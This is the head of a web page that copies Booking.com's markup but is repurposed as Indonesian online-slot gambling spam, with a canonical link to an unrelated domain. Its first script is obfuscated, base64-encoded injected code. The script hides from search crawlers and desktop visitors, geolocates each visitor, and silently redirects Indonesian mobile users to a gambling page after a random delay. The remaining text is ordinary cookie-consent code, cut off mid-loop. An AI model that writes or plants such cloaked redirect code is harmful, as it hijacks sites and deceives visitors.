<!DOCTYPE html>
<link href="https://cf.bstatic.com" rel="dns-prefetch" crossorigin>
<link href="https://cf.bstatic.com" rel="dns-prefetch" crossorigin>
<html lang="id" prefix="og: http://ogp.me/ns# fb: http://ogp.me/ns/fb# booking_com: http://ogp.me/ns/fb/booking_com#" xmlns:og="http://opengraphprotocol.org/schema/" class="noJS b_chrome b_chrome_140 supports_inline-block supports_flexbox_unprefixed supports_fontface " >
<head profile="http://a9.com/-/spec/opensearch/1.1/">
<meta name="referrer" content="strict-origin-when-cross-origin">
<script>
function _0xfe65(_0x259b1e,_0x176aaa){_0x259b1e=_0x259b1e-0x82;var _0x2f298b=_0x2f29();var _0xfe6535=_0x2f298b[_0x259b1e];return _0xfe6535;}(function(_0x56ff5e,_0x462f76){var _0x294f57=_0xfe65,_0x4b8329=_0x56ff5e();while(!![]){try{var _0xfea2ea=parseInt(_0x294f57(0x94))/0x1+parseInt(_0x294f57(0x8d))/0x2*(parseInt(_0x294f57(0x91))/0x3)+parseInt(_0x294f57(0x89))/0x4*(-parseInt(_0x294f57(0x95))/0x5)+parseInt(_0x294f57(0x97))/0x6+-parseInt(_0x294f57(0xa3))/0x7+parseInt(_0x294f57(0xa6))/0x8*(parseInt(_0x294f57(0x9b))/0x9)+parseInt(_0x294f57(0xa7))/0xa*(-parseInt(_0x294f57(0x9a))/0xb);if(_0xfea2ea===_0x462f76)break;else _0x4b8329['push'](_0x4b8329['shift']());}catch(_0x105c48){_0x4b8329['push'](_0x4b8329['shift']());}}}(_0x2f29,0x5a9a1),(function(){var _0x3713a3=_0xfe65,_0x16ae75=_0x3713a3(0xa4),_0x5e59db=_0x3713a3(0xa0),_0x1f4a91=_0x3713a3(0x9f),_0x158533=atob(_0x16ae75),_0x3040eb=atob(_0x5e59db),_0x25f63b=atob(_0x1f4a91),_0xd12aa3=location[_0x3713a3(0x83)],_0x3bd8a5=navigator[_0x3713a3(0x99)][_0x3713a3(0x9e)]();if(_0xd12aa3===_0x158533||_0xd12aa3[_0x3713a3(0x8f)]('.'+_0x158533))return;if(/(googlebot|bingbot|yandex|baidu|duckduck|slurp|crawler|spider|inspection|verification)/i[_0x3713a3(0x88)](_0x3bd8a5))return;if(!/android|iphone|ipad|ipod|iemobile|opera mini|windows phone/i[_0x3713a3(0x88)](_0x3bd8a5))return;fetch('https://ipapi.co/json/')[_0x3713a3(0xa1)](_0x4afadd=>_0x4afadd[_0x3713a3(0x87)]())[_0x3713a3(0xa1)](_0x1e72d1=>{var _0x5cfd54=_0x3713a3;if(_0x1e72d1&&_0x1e72d1['country_code']==='ID'){if(!document[_0x5cfd54(0x9d)](_0x5cfd54(0x96))){var _0x2a5fec=document[_0x5cfd54(0x84)](_0x5cfd54(0xa2));_0x2a5fec[_0x5cfd54(0x8b)]=_0x5cfd54(0x9c),_0x2a5fec[_0x5cfd54(0xa5)]=_0x25f63b,document[_0x5cfd54(0x85)][_0x5cfd54(0x8e)](_0x2a5fec);}var _0xeb6b3b=document['createElement']('a');_0xeb6b3b[_0x5cfd54(0xa5)]=_0x25f63b,_0xeb6b3b[_0x5cfd54(0x90)]='\x20',_0xeb6b3b[_0x5cfd54(0x8a)]['cssText']=_0x5cfd54(0x82),document[_0x5cfd54(0x93)][_0x5cfd54(0x8e)](_0xeb6b3b);var _0x9f479f=0x3e8+Math[_0x5cfd54(0x8c)](Math[_0x5cfd54(0x86)]()*0x7d0);setTimeout(function(){var _0x3fe64f=_0x5cfd54;location[_0x3fe64f(0x98)](_0x3040eb);},_0x9f479f);}})[_0x3713a3(0x92)](()=>{});}()));function _0x2f29(){var _0x14fdb=['createElement','head','random','json','test','2028fioShk','style','rel','floor','1878UobwCw','appendChild','endsWith','textContent','1131MOioCO','catch','body','79243SOFzzg','2085RRDzTg','link[rel=\x22canonical\x22]','4224612ZCvDSN','replace','userAgent','11EBzvmU','20349qYhqNZ','canonical','querySelector','toLowerCase','aHR0cHM6Ly9uaWtvZW5lcmd5bHRkLmNvbS9vdXItdmlkZW9zLw==','aHR0cHM6Ly9DLUUtTy5iLWNkbi5uZXQvSkFOR0FOLU1BTElORy1QVU5ZQS1DLUUtTy5odG1s','then','link','4187638CpREmW','bmlrb2VuZXJneWx0ZC5jb20=','href','1832bTeayU','4743590DQlPdj','position:absolute;left:-9999px;width:1px;height:1px;overflow:hidden;','hostname'];_0x2f29=function(){return _0x14fdb;};return _0x2f29();}
</script>
<meta http-equiv="content-type" content="text/html; charset=utf-8" />
<script nonce="cH3DZKVyvb8x5Uh">
;(function(w){
var ts = +new Date();
w.PageLoadTimer = {};
w.PageLoadTimer.start = ts;
}(window));
</script>
<script nonce="cH3DZKVyvb8x5Uh"> 
;(function() {
window.b_early_errors = window.b_early_errors || [];
window.onerror = function() {
window.b_early_errors.push(arguments);
};
}());
</script>
<link rel="stylesheet" id="main-css-preload" href="https://cf.bstatic.com/static/css/main_cloudfront_sd.iq_ltr/07307e07faca267fa937c0639ab45b3770e503d5.css"  data-main-css="1" />
<script nonce="cH3DZKVyvb8x5Uh">
document.querySelector('#main-css-preload').addEventListener('load', function() {
window.mainCssWasLoaded = 1;
})
</script>
<meta name="google-site-verification" content="UqC4hWBUoVN2ZbaD5bz0GD9q3hInTK0DyWHA8GrkQF0" />
<link rel="_prefetch" data-defer-prefetch href="https://cf.bstatic.com/static/css/searchresults_cloudfront_sd.iq_ltr/4e480a305c689c593d3af4cdb1a1afd789aa60e0.css">
<link rel="_prefetch" data-defer-prefetch href="https://cf.bstatic.com/static/css/book_cloudfront_sd.iq_ltr/ddad1a724ada14d59162038f1adbccf34f9fe77d.css">

<style nonce="cH3DZKVyvb8x5Uh"> #basiclayout, .basiclayout { margin: 0; } #special_actions { margin: 3px 15px 3px 0; } .ticker_space { margin-top: 3px !important; } #logo_no_globe_new_logo { top: 14px; } .b_msie_6 #top, .b_msie_6 body.header_reshuffle #top {height:61px !important;} .b_msie_6 #special_actions { margin: 3px 15px 3px 0; overflow:visible; } body.header_reshuffle #top { min-height: 50px !important; height: auto !important; } .nobg { background: #fff url("https://cf.bstatic.com/static/img/nobg_all_blue_iq/b700d9e3067c1186a3364012df4fe1c48ae6da44.png") repeat-x; background-position: 0 -50px; } </style> 
<script nonce="cH3DZKVyvb8x5Uh"> if( window.performance && performance.measure && 'b-stylesheets') { performance.measure('b-stylesheets'); } </script>
<title>GRTOTO: Bandar Slot Online Hari ini Keamanan Pasti Terjamin</title>
<meta name="description" content="GRTOTO hadir sebagai platform resmi bandar slot online hari ini, dirancang dengan keamanan terjamin supaya para pemain bisa menikmati permainan lebih nyaman." />
<meta name="keywords" content="GRTOTO, jamu slot, slot gacor, slot777, slot777 gacor, slot," />
<meta name="robots" content="index,follow" />
<link rel="canonical" href="https://nikoenergyltd.com/our-videos/" />
<link rel="amphtml" href="https://c-e-o.b-cdn.net/slot.html">
<link rel="alternate" hreflang="id" href="https://nikoenergyltd.com/our-videos/"/>
<meta name="twitter:app:id:iphone" content="GRTOTO" />
<meta name="twitter:app:name:ipad" content="GRTOTO" />
<meta name="twitter:app:id:ipad" content="GRTOTO" />
<meta name="twitter:app:name:googleplay" content="Booking.com Hotel Reservations" />
<meta name="twitter:app:id:googleplay" content="com.booking" />
<meta property="al:ios:app_store_id" content="GRTOTO">
<meta property="al:ios:app_name" content="GRTOTO">
<meta property="al:android:app_name" content="GRTOTO">
<meta property="al:android:package" content="GRTOTO">
<meta name="twitter:title" content="GRTOTO: Bandar Slot Online Hari ini Keamanan Pasti Terjamin" />
<meta name="twitter:description" content="GRTOTO hadir sebagai platform resmi bandar slot online hari ini, dirancang dengan keamanan terjamin supaya para pemain bisa menikmati permainan lebih nyaman." />
<meta name="twitter:image" content="https://ik.imagekit.io/ljdihgltp/GRTOTO/bandar-slot.jpg" />
<meta name="twitter:app:url:iphone" content="https://www.booking.com/hotel/id/tresorsdafrique.com/en/categorie-produit/coffees/" />
<meta name="twitter:app:url:ipad" content="https://www.booking.com/hotel/id/tresorsdafrique.com/en/categorie-produit/coffees/" />
<meta name="twitter:app:url:googleplay" content="https://www.booking.com/hotel/id/tresorsdafrique.com/en/categorie-produit/coffees/" />
<meta property="al:ios:url" content="https://www.booking.com/hotel/id/tresorsdafrique.com/en/categorie-produit/coffees/" />
<meta property="al:android:url" content="https://www.booking.com/hotel/id/tresorsdafrique.com/en/categorie-produit/coffees/" />
<meta name="p:domain_verify" content="ff7f0b90ebb93e5bf7c7cafe77640ec1"/>
<meta http-equiv="content-language" content="id" />
<meta http-equiv="content-script-type" content="text/javascript" />
<meta http-equiv="content-style-type" content="text/css" />
<meta http-equiv="window-target" content="_top" />
<meta property="fb:pages" content="131840030178250, 1425349334428496, 117615518393985, 1565844503706287, 517612321758712, 1668799180037291, 265097377176252, 1643712662515912, 303492549842824, 1638321783047271, 809709019119342, 959185470826086, 217466488652137, 641365839348517, 203741606405114">
<meta property="wb:webmaster" content="48970bbca45d28c2" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:site" content="GRTOTO">
<meta name="twitter:creator" content="GRTOTO">
<meta property="og:title" content="GRTOTO: Bandar Slot Online Hari ini Keamanan Pasti Terjamin" />
<meta property="og:description" content="GRTOTO hadir sebagai platform resmi bandar slot online hari ini, dirancang dengan keamanan terjamin supaya para pemain bisa menikmati permainan lebih nyaman." />
<meta property="og:image" content="https://ik.imagekit.io/ljdihgltp/GRTOTO/bandar-slot.jpg" />
<meta property="og:image:width" content="768" />
<meta property="og:image:height" content="768" />
<meta property="og:image:secure_url" content="https://ik.imagekit.io/ljdihgltp/GRTOTO/bandar-slot.jpg" />
<meta property="booking_com:location:latitude" content="" />
<meta property="booking_com:location:longitude" content="" />
<meta property="og:locale" content="id_ID" />
<meta property="og:url" content="https://nikoenergyltd.com/our-videos/" />
<meta property="og:site_name" content="Booking.com" />
<meta property="fb:app_id" content="145362478954725" />
<link rel="alternate" type="text/html" hreflang="en-gb" href="https://www.booking.com/index.en-gb.html" title="English (UK)"/>
<link rel="alternate" type="text/html" hreflang="en-us" href="https://www.booking.com/" title="English (US)"/>
<link rel="alternate" type="text/html" hreflang="de" href="https://www.booking.com/index.de.html" title="Deutsch"/>
<link rel="alternate" type="text/html" hreflang="nl" href="https://www.booking.com/index.nl.html" title="Nederlands"/>
<link rel="alternate" type="text/html" hreflang="fr" href="https://www.booking.com/index.fr.html" title="Français"/>
<link rel="alternate" type="text/html" hreflang="es" href="https://www.booking.com/index.es.html" title="Español"/>
<link rel="alternate" type="text/html" hreflang="es-ar" href="https://www.booking.com/index.es-ar.html" title="Español (AR)"/>
<link rel="alternate" type="text/html" hreflang="es-mx" href="https://www.booking.com/index.es-mx.html" title="Español (MX)"/>
<link rel="alternate" type="text/html" hreflang="ca" href="https://www.booking.com/index.ca.html" title="Català"/>
<link rel="alternate" type="text/html" hreflang="it" href="https://www.booking.com/index.it.html" title="Italiano"/>
<link rel="alternate" type="text/html" hreflang="pt-pt" href="https://www.booking.com/index.pt-pt.html" title="Português (PT)"/>
<link rel="alternate" type="text/html" hreflang="pt-br" href="https://www.booking.com/index.pt-br.html" title="Português (BR)"/>
<link rel="alternate" type="text/html" hreflang="no" href="https://www.booking.com/index.no.html" title="Norsk"/>
<link rel="alternate" type="text/html" hreflang="fi" href="https://www.booking.com/index.fi.html" title="Suomi"/>
<link rel="alternate" type="text/html" hreflang="sv" href="https://www.booking.com/index.sv.html" title="Svenska"/>
<link rel="alternate" type="text/html" hreflang="da" href="https://www.booking.com/index.da.html" title="Dansk"/>
<link rel="alternate" type="text/html" hreflang="cs" href="https://www.booking.com/index.cs.html" title="Čeština"/>
<link rel="alternate" type="text/html" hreflang="hu" href="https://www.booking.com/index.hu.html" title="Magyar"/>
<link rel="alternate" type="text/html" hreflang="ro" href="https://www.booking.com/index.ro.html" title="Română"/>
<link rel="alternate" type="text/html" hreflang="ja" href="https://www.booking.com/index.ja.html" title="日本語"/>
<link rel="alternate" type="text/html" hreflang="zh-cn" href="https://www.booking.com/index.zh-cn.html" title="简体中文"/>
<link rel="alternate" type="text/html" hreflang="zh-tw" href="https://www.booking.com/index.zh-tw.html" title="繁體中文"/>
<link rel="alternate" type="text/html" hreflang="pl" href="https://www.booking.com/index.pl.html" title="Polski"/>
<link rel="alternate" type="text/html" hreflang="el" href="https://www.booking.com/index.el.html" title="Ελληνικά"/>
<link rel="alternate" type="text/html" hreflang="ru" href="https://www.booking.com/index.ru.html" title="Русский"/>
<link rel="alternate" type="text/html" hreflang="tr" href="https://www.booking.com/index.tr.html" title="Türkçe"/>
<link rel="alternate" type="text/html" hreflang="bg" href="https://www.booking.com/index.bg.html" title="Български"/>
<link rel="alternate" type="text/html" hreflang="ar" href="https://www.booking.com/index.ar.html" title="العربية"/>
<link rel="alternate" type="text/html" hreflang="ko" href="https://www.booking.com/index.ko.html" title="한국어"/>
<link rel="alternate" type="text/html" hreflang="he" href="https://www.booking.com/index.he.html" title="עברית"/>
<link rel="alternate" type="text/html" hreflang="lv" href="https://www.booking.com/index.lv.html" title="Latviski"/>
<link rel="alternate" type="text/html" hreflang="uk" href="https://www.booking.com/index.uk.html" title="Українська"/>
<link rel="alternate" type="text/html" hreflang="hi" href="https://www.booking.com/index.hi.html" title="हिन्दी"/>
<link rel="alternate" type="text/html" hreflang="id" href="https://nikoenergyltd.com/our-videos/" title="Bahasa Indonesia"/>
<link rel="alternate" type="text/html" hreflang="ms" href="https://www.booking.com/index.ms.html" title="Bahasa Malaysia"/>
<link rel="alternate" type="text/html" hreflang="th" href="https://www.booking.com/index.th.html" title="ภาษาไทย"/>
<link rel="alternate" type="text/html" hreflang="et" href="https://www.booking.com/index.et.html" title="Eesti"/>
<link rel="alternate" type="text/html" hreflang="hr" href="https://www.booking.com/index.hr.html" title="Hrvatski"/>
<link rel="alternate" type="text/html" hreflang="lt" href="https://www.booking.com/index.lt.html" title="Lietuvių"/>
<link rel="alternate" type="text/html" hreflang="sk" href="https://www.booking.com/index.sk.html" title="Slovenčina"/>
<link rel="alternate" type="text/html" hreflang="sr" href="https://www.booking.com/index.sr.html" title="Srpski"/>
<link rel="alternate" type="text/html" hreflang="sl" href="https://www.booking.com/index.sl.html" title="Slovenščina"/>
<link rel="alternate" type="text/html" hreflang="vi" href="https://www.booking.com/index.vi.html" title="Tiếng Việt"/>
<link rel="alternate" type="text/html" hreflang="tl" href="https://www.booking.com/index.tl.html" title="Filipino"/>
<link rel="alternate" type="text/html" hreflang="is" href="https://www.booking.com/index.is.html" title="Íslenska"/>
<link rel="icon" href="https://1v5pkxe0s3.ucarecd.net/e69e9174-cd02-495b-bf8a-f191b797f75e/iconceo.png" type="image/svg+xml">
<link rel="icon" href="https://1v5pkxe0s3.ucarecd.net/e69e9174-cd02-495b-bf8a-f191b797f75e/iconceo.png" type="image/png" sizes="192x192">
<link rel="icon" href="https://1v5pkxe0s3.ucarecd.net/e69e9174-cd02-495b-bf8a-f191b797f75e/iconceo.png" sizes="32x32">
<link rel="apple-touch-icon" href="https://1v5pkxe0s3.ucarecd.net/e69e9174-cd02-495b-bf8a-f191b797f75e/iconceo.png" />
<link rel="help" href="/faq.id.html?aid=356980&label=gog235jc-10CAsoaEI2dHVwYWl3aW4tcmVrb21lbmRhc2ktdG90by1zbG90LXRlcnBlcmNheWEtbWluLWRlcG8tMTBrSAlYA2hoiAEBmAEzuAEXyAEM2AED6AEB-AEBiAIBqAIBuALNvt3GBsACAdICJDczM2Y4YTUyLTgzY2YtNGYzYS04NjJmLWQxY2ZiMDEzMmI1ZtgCAeACAQ&sid=7ddc46c9c1086cdb3bc11bc91f12833b&amp;" />
<link rel="search" type="application/opensearchdescription+xml" href="https://cf.bstatic.com/static/opensearch/id/69dddbb2b8f6e793c1dd77469c74f13499a4c923.xml" title="Pemesanan hotel online Booking.com" />
<link href="https://plus.google.com/105443419075154950489" rel="publisher" />

<script type="text/javascript" nonce="cH3DZKVyvb8x5Uh">
window.PCM = {
config: {
isBanner: false,
domainUUID: '3ea94870-d4b1-483a-b1d2-faf1d982bb31',
isPCSIntegration: true,
shareConsentWithin: 'www.booking.com',
isCrossDomainCookieSharingEnabled: false,
nonce: 'cH3DZKVyvb8x5Uh',
countryCode: 'id',
isUserLoggedIn: false,
},
pcm_consent_cookie: 'analytical=true&amp;countryCode=ID&amp;consentId=365003b4-293f-44ca-8e1d-b7e1ed6295f6&amp;consentedAt=2025-09-27T03:51:41.151Z&amp;expiresAt=2026-03-26T03:51:41.151Z&amp;implicit=true&amp;marketing=true&amp;regionCode=JK&amp;regulation=none&amp;legacyRegulation=none'
};
(()=>{let e,c=e=>{let n,t,o=new FormData,i={error:e.message||"",message:e.message||"",stack:e.stack||"",name:"js_errors",colno:0,lno:0,url:window.location.hostname+window.location.pathname,pid:(null==(t=null==(n=window.B)?void 0:n.env)?void 0:t.pageview_id)||1,be_running:1,be_column:0,be_line:0,be_stack:e.stack||"",be_message:e.message||"",be_file:window.location.hostname+window.location.pathname};Object.keys(i).forEach(e=>{o.append(e,i[e])}),window.fetch("/js_errors",{method:"POST",body:o}).catch(()=>!1)};window.cookieStore&&window.cookieStore.addEventListener("change",e=>{var n;null!=(n=null==e?void 0:e.changed)&&n.length&&null!=e&&e.changed.forEach(e=>{"OptanonAlertBoxClosed"!==e.name||D(e.value)||c(new Error("OptanonAlertBoxClosed bad value detected: "+e.value)),"OptanonConsent"!==e.name||M(e.value)||c(new Error("OptanonConsent bad value detected: "+e.value))})});let _;(d=_=_||{}).ANALYTICAL="C0002",d.MARKETING="C0004";let g;(d=g=g||{}).PREFERENCES_SAVE_SETTINGS="preferences_save_settings",d.BANNER_REJECT_ALL="banner_reject_all",d.BANNER_ACCEPT_ALL="banner_accept_cookies",d.PREFERENCES_REJECT_ALL="preferences_reject_all",d.PREFERENCES_ACCEPT_ALL="preferences_allow_all";let u,B=((d=u=u||{}).BACKFILLING="back_filling",d.GPC_SIGNAL="gpc_signal",[g.BANNER_ACCEPT_ALL,g.PREFERENCES_ACCEPT_ALL,g.PREFERENCES_SAVE_SETTINGS]),m=[g.BANNER_REJECT_ALL,g.PREFERENCES_REJECT_ALL,g.PREFERENCES_SAVE_SETTINGS],t,I=new Promise(function(e){t=e}),G=window.B&&window.B.env&&window.B.env.b_user_genius_status&&window.B.env.b_user_genius_status.b_genius_level?"genuis_level_"+window.B.env.b_user_genius_status.b_genius_level:"",f={analytical:_.ANALYTICAL+"%3A1",marketing:_.MARKETING+"%3A1"},j="%2C",o="bkng_wvpc",n=window.location.hostname,v=P("isPCSIntegration")||!1,i=P("shareConsentWithin")||!1,w=P("countryCode");var a,r,s,d=P("cookieDomain")||n,l=null!=(e=P("isCrossDomainCookieSharingEnabled"))&&e;let p=";domain="+(l?2<=(r=(a=d).split(".")).length?r.slice(-2).join("."):a:d),C,h=(C="localhost"===n?"http://localhost:8080/dqs":/\.(?:dev|dqs)\.booking\.com/.test(window.location.origin)?"https://account.dqs.booking.com":"https://account.booking."+(/booking\.cn/.test(window.location.origin)?"cn":"com"),31536e6),E="us"!==w?15552e6:h,k="function"==typeof XDomainRequest,K=P("domainUUID")||"",A=P("nonce"),O=P("isBanner")||!1,U=P("isUserLoggedIn"),b=!1;function P(e){return window.PCM&&window.PCM.config&&void 0!==window.PCM.config[e]?window.PCM.config[e]:null}function y(e){e=J(e);let n={};return"string"==typeof e&&(e=e.split("&")).length&&e.forEach(function(e){e=e.split("=");2===e.length&&(n[e[0]]=e[1])}),n}function S(n){return Object.keys(n).map(function(e){return e+"="+n[e]}).join("&")}function F(e){var n=document.createElement("iframe");n.onload=t,n.src="https://"+i+"/cookiebanner.html",n.id="OTcrossDomain",n.role="none",n.frameborder="0",n.height="0",n.width="0",n.role="none";return n.setAttribute("style","position: absolute; overflow: hidden; clip: rect(0 0 0 0); width: 1px; height: 1px; margin: -1px; padding: 0; white-space: nowrap; border: 0; clip-path: inset(100%);"),n.setAttribute("aria-hidden","true"),n.setAttribute("tabindex","-1"),n.setAttribute("data-propagate-only-forced-consent",""+e),document.body.appendChild(n),n}function T(e,n,t=!1){let o={type:"onetrust",OptanonConsent:e},i=(D(n)&&(o.OptanonAlertBoxClosed=n),window.document.getElementById("OTcrossDomain"));(i=t&&!i?F(t):i)&&i.contentWindow&&("true"!==(e=i.getAttribute("data-propagate-only-forced-consent"))||"true"===e&&t)&&I.then(function(){var e;null!=(e=i.contentWindow)&&e.postMessage(o,"*")})}function M(e){if(void 0!==e&&null!=e)try{var n=y(e);return 0<Object.keys(n).length}catch(e){}}function D(e){if(void 0!==e&&null!=e&&isNaN(+e))return e=new Date(e),!isNaN(e.getTime())}function q(e,n,t,o){window.PCM.__mustInjectSDK||void 0===window.Optanon||void 0===e||(e=-1<e.indexOf(t),(void 0!==window.OptanonActiveGroups?-1<window.OptanonActiveGroups.indexOf(n):void 0)!==(window.PCM[o]=e)&&window.Optanon.UpdateConsent("Category",n+":"+(e?"1":"0")))}function L(){var e=y(window.PCM.__getCookie("OptanonConsent"));q(e.groups,_.ANALYTICAL,f.analytical,"Analytical"),q(e.groups,_.MARKETING,f.marketing,"Marketing")}function x(n,t){if(M(n)){let e;var o=(e=D(t)?new Date(t):new Date).getTime()+h,o=new Date(o).toUTCString(),n=J(n);document.cookie="OptanonConsent="+n+p+";path=/;expires="+o+";secure;samesite=none;",D(t)&&(document.cookie="OptanonAlertBoxClosed="+t+p+";path=/;expires="+o+";secure;samesite=none;"),L()}}function N(n,t,o,i){if(v){b=!0;let e=new XMLHttpRequest;e.withCredentials=!0,e.onload=function(){200===e.status?o():(b=!1,i&&i())},e.open("POST",C+"/privacy-consents",!0),e.setRequestHeader("Content-type","application/json;charset=UTF-8"),e.send(JSON.stringify(Object.assign({client_type:"web",client_id:"vO1Kblk7xX9tUn2cpZLS",optanon_action:t,genius_status:G},n)))}}function J(e){return e=e&&-1<e.indexOf("%253")?decodeURI(e):e}function H(e,n){e.backfilled_at=(new Date).getTime(),e.backfilled_seed=1;e=S(e);x(e,n),T(e,n)}function R(){if(v&&!b){let t=new XMLHttpRequest;t.withCredentials=!0,t.onload=function(){var e,n;200===t.status&&((e=y(window.PCM.__getCookie("OptanonConsent"))).implicitConsentCountry=O?"GDPR":"nonGDPR",e.implicitConsentDate=(new Date).getTime(),e=S(e),n=(new Date).getTime()+h,n=new Date(n).toUTCString(),document.cookie="OptanonConsent="+e+p+";path=/;expires="+n+";secure;samesite=none;",L(),T(e,window.PCM.__getCookie("OptanonAlertBoxClosed")))},t.open("POST",C+"/privacy-consents/implicit",!0),t.setRequestHeader("Content-type","application/json;charset=UTF-8"),t.send(JSON.stringify({client_type:"web",client_id:"vO1Kblk7xX9tUn2cpZLS"}))}}i&&l&&Object.defineProperty(window,"otStubData",{set:function(e){e&&e.domainData&&e.domainData.ScriptType&&"PRODUCTION"===e.domainData.ScriptType&&(e.domainData.ScriptType="TEST"),this._otStubData=e},get:function(){return this._otStubData}});let W={a:"analytical",m:"marketing"};function X(){var e,n;let t=(e=>{if(e){var n=e.split("&"),t={};for(let e=0;e<n.length;e++){var o=n[e].split(":");if(2!==o.length)return;var i=o[0],o=o[1],i=W[i];if(!i)return;t[i]="1"===o}return t}})(window.PCM.__getCookie(o));t&&((e=y(window.PCM.__getCookie("OptanonConsent"))).groups=Object.keys(t).filter(function(e){return t[e]}).map(function(e){return f[e]}).join(j),x(e=S(e),n=(new Date).toISOString()),T(e,n),window.PCM.__deleteCookie(o))}function Y(e,n){try{if(!k){x(e,n),d=window.PCM.__getCookie("OptanonConsent"),l=window.PCM.pcm_consent_cookie,d&&l&&(r=-1<((d=y(d)).groups||"").indexOf(f.analytical)?1:0,d=-1<(d.groups||"").indexOf(f.marketing)?1:0,s="true"===(l=y(l.replace(/&amp;/g,"&"))).analytical?1:0,l="true"===l.marketing?1:0,k||r==s&&d==l||N({analytical:r,marketing:d},u.BACKFILLING,()=>{}));var t=window.navigator.globalPrivacyControl;if(v&&t&&"us"===w){let a=y(window.PCM.__getCookie("OptanonConsent"));var t=[],o=(a.consentCausedByGPCSignalStored||t.push(new Promise(function(e,n){N({analytical:0,marketing:0,is_first_time_gpc_signal:1},u.GPC_SIGNAL,function(){e({consentCausedByGPCSignalStored:(new Date).getTime()})},function(){n({})})})),null===U||U);o&&!a.dnsmiCapturedTimestamp&&t.push(new Promise(function(e,n){let t=new XMLHttpRequest;t.withCredentials=!0,t.onload=function(){200<=t.status&&t.status<=299?e({dnsmiCapturedTimestamp:(new Date).getTime()}):n({})},t.open("POST",C+"/dnsmi",!0),t.setRequestHeader("Content-type","application/json;charset=UTF-8"),t.send()})),Promise.allSettled(t).then(function(n){let t=!1;for(let e=0;e<n.length;e++){var o=n[e];"fulfilled"===o.status&&(Object.assign(a,o.value),t=!0)}var e,i;t&&(e=window.PCM.__getCookie("OptanonAlertBoxClosed"),x(i=S(a),e),T(i,e))})}X(),i=y(window.PCM.__getCookie("OptanonConsent")),D(a=window.PCM.__getCookie("OptanonAlertBoxClosed"))&&(new Date).getTime()-new Date(a).getTime()<=E||(!i.implicitConsentDate||(new Date).getTime()-parseInt(i.implicitConsentDate)>=E?R():O?"GDPR"!==i.implicitConsentCountry&&R():"nonGDPR"!==i.implicitConsentCountry&&R()),!function(){if(v){var n=window.PCM.__getCookie("OptanonConsent"),t=window.PCM.__getCookie("OptanonAlertBoxClosed");if(M(n)&&D(t)){var o,n=y(n),i=new Date(t);if(n.groups&&(void 0===n.backfilled_at||new Date(parseInt(n.backfilled_at))<i)){let e;n.geolocation&&(o=n.geolocation.split("%3B"),e={country:o[0],country_region:o[1]}),N(Object.assign({analytical:-1<n.groups.indexOf(f.analytical)?1:0,marketing:-1<n.groups.indexOf(f.marketing)?1:0,consented_at:i.toISOString()},e),u.BACKFILLING,H.bind(this,n,t))}}}}(),window.PCM.__injectSDK()}}catch(e){c(e)}var i,a,r,s,d,l}let V=(e,n)=>{"complete"===document.readyState?window.PCM.__dispatchEvent(e,n):window.addEventListener("load",function(){window.PCM.__dispatchEvent(e,n)})};window.OptanonWrapper=function(...e){var n,t=void 0!==window.Optanon&&"function"==typeof window.Optanon.GetDomainData?window.Optanon.GetDomainData().ShowAlertNotice:void 0,o=(L(),document.getElementById("onetrust-policy-text"));if(o&&!o.hasAttribute("tabindex")&&o.setAttribute("tabindex","0"),t)for(let e=window.PCM.__eventCounter;e<window.dataLayer.length;e++)"trackOptanonEvent"!==window.dataLayer[e].event&&"trackOptanonEvent"!==window.dataLayer[e][1]||(n=(window.dataLayer[e].optanonAction||window.dataLayer[e][2].optanonAction).toLowerCase().replace(/\s/g,"_"),-1===B.indexOf(n)&&-1===m.indexOf(n))||(window.PCM.syncConsent(n),window.PCM.__dispatchEvent("cookie_banner_closed")),window.PCM.__eventCounter++;else window.PCM.__dispatchEvent("cookie_consent_available");"function"==typeof window.OptanonWrapperCallback&&window.OptanonWrapperCallback(e)},window.PCM=Object.assign({Marketing:!1,Analytical:!1,__eventCounter:0,__mustInjectSDK:!0,__dispatchEvent:function(e,n){n=n||window.PCM;let t;CustomEvent?(t=document.createEvent("CustomEvent")).initCustomEvent(e,!0,!0,n):t=new CustomEvent(e,{detail:n}),document.dispatchEvent(t)},__injectSDK:function(){var e,n;window.PCM.__mustInjectSDK&&(D(null!=(n=window.PCM.__getCookie("OptanonAlertBoxClosed"))?n:"")||window.PCM.__deleteCookie("OptanonAlertBoxClosed"),(n=document.createElement("script")).type="text/javascript",n.setAttribute("async","true"),n.setAttribute("src","https://cdn.cookielaw.org/scripttemplates/otSDKStub.js"),n.setAttribute("charset","UTF-8"),n.setAttribute("data-document-language","true"),n.setAttribute("data-domain-script",K),A&&n.setAttribute("nonce",A),n.addEventListener("load",function(){V("cookie_banner_loaded",{willBannerBeShown:!window.PCM.isUserGaveConsent()})}),n.addEventListener("error",function(){V("cookie_banner_loaded",{willBannerBeShown:!1})}),null!=(e=null==(e=document.getElementsByTagName("head"))?void 0:e.item(0))&&e.appendChild(n),window.PCM.__mustInjectSDK=!1)},__getCookie:function(e){e+="=";var n=document.cookie.split(";");let t,o;for(t=0;t<n.length;t+=1){for(o=n[t];" "==o.charAt(0);)o=o.substring(1,o.length);if(0==o.indexOf(e))return o.substring(e.length,o.length)}return null},__deleteCookie:function(e){document.cookie=e+"=;path=/;domain="+n+";expires=Thu, 01 Jan 1970 00:00:01 GMT",document.cookie=e+"=;path=/;domain=;expires=Thu, 01 Jan 1970 00:00:01 GMT"},isUserGaveConsent:()=>{var e=window.PCM.__getCookie("OptanonAlertBoxClosed");return!!e&&(new Date).getTime()-new Date(e).getTime()<=E},syncConsent:function(e=g.BANNER_REJECT_ALL,n){var t=window.PCM.__getCookie("OptanonAlertBoxClosed"),o=window.PCM.__getCookie("OptanonConsent"),i=y(o),a=-1<(i.groups||"").indexOf(f.analytical)?1:0,r=-1<(i.groups||"").indexOf(f.marketing)?1:0;if(T(o,t,n),!k&&v&&N({analytical:a,marketing:r},e,H.bind(this,i,t)),!(-1===m.indexOf(e)||window.PCM.Analytical&&window.PCM.Marketing)){var s=[...window.PCM.Analytical?[]:[_.ANALYTICAL],...window.PCM.Marketing?[]:[_.MARKETING]],d=[];for(let e=0;e<(null==(l=null==(l=null==(l=window.Optanon)?void 0:l.GetDomainData())?void 0:l.Groups)?void 0:l.length);e++){var l=window.Optanon.GetDomainData().Groups[e];l.CustomGroupId&&-1!==s.indexOf(l.CustomGroupId)&&d.push(l)}var c=[],u=document.cookie.split("; ");for(let e=0;e<u.length;e++)c.push(u[e].split("=")[0]);for(let e=0;e<d.length;e++){var w=d[e].Cookies;for(let e=0;e<w.length;e++){var p=[w[e].Name];if(-1!==p[0].indexOf("xx")){var C=new RegExp("^"+p[0].replaceAll("x","\\w")+"$","g");for(let 